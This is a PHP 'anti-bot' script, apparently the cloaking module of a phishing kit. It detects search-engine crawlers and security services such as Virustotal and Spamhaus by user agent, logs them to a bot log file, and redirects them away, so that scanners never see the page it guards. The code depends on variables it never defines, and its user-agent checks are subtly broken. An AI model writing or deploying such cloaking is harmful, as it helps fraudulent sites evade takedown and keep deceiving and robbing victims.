<?php

$bot_count = 0;
if(strpos($_SERVER['HTTP_USER_AGENT'], 'google') 
	or strpos($_SERVER['HTTP_USER_AGENT'], 'Java') 
	or strpos($_SERVER['HTTP_USER_AGENT'], 'FreeBSD') 
	or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') 
	or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp') 
	or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker') 
	or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') 
	or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') 
	or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler')  
	or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL') 
	or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') 
    or strpos($_SERVER['HTTP_USER_AGENT'], 'Virustotal')
    or strpos($_SERVER['HTTP_USER_AGENT'], 'Spamhaus') !== false) {
    $bot_count += 1;
}

if ($_SERVER['HTTP_USER_AGENT'] == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
	$bot_count += 1;
}

if($bot_count > 0){
    $date = date("h:i:s d/m/Y");
    $useragent = $useragent;
    $message = "+++++[ BOT - Anti.php ]+++++\n";
    $message .= "IP         : ".$ip."\n";
    $message .= "OS         : ".$os."\n";
    $message .= "Browser    : ".$browser."\n";
    $message .= "User-Agent : ".$useragent."\n";
    $message .= "+++++[ ######### ]+++++\n\n";
    $xy = fopen("./Logs/botlogs.txt", "a+");
    fwrite($xy, $message);
    fclose($xy);
    header('Location: https://href.li/?https://www.google.com/search?q='.$settings['out']);
}

?>